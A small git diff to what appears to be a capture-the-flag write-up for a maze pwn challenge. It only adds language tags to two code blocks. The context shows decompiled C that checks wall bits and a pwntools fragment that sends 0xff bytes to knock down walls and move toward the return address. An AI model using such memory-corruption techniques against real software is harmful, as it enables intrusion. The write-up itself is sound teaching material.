@@ -60,7 +60,7 @@ In `play_maze` there's three areas of interest:
 
 A single nibble is used to store where the walls are not, IOW the directions that are open to you.  `0xf` will enable movement in any direction.
 
-```
+```c
   switch(iVar2 - 0x61U & 0xff) { // translate a-z to 0-25
   case 0: // a for west
     if ((*(byte *)(auStack51244 + (uVar6 + lVar4 * 0x28) * 8) & 1) != 0) {
@@ -167,7 +167,7 @@ for j in range(40 - y):
 
 Next, we just kick down the walls and move to the lower right, this is at the end of the allocated buffer for the maze and not far from the return address.
 
-```
+```python
 # lets bust out of here, return to the east
 p.sendlineafter(b'): ', b'x')
 p.sendlineafter(b'?\n', 0x20 * b'\xff')
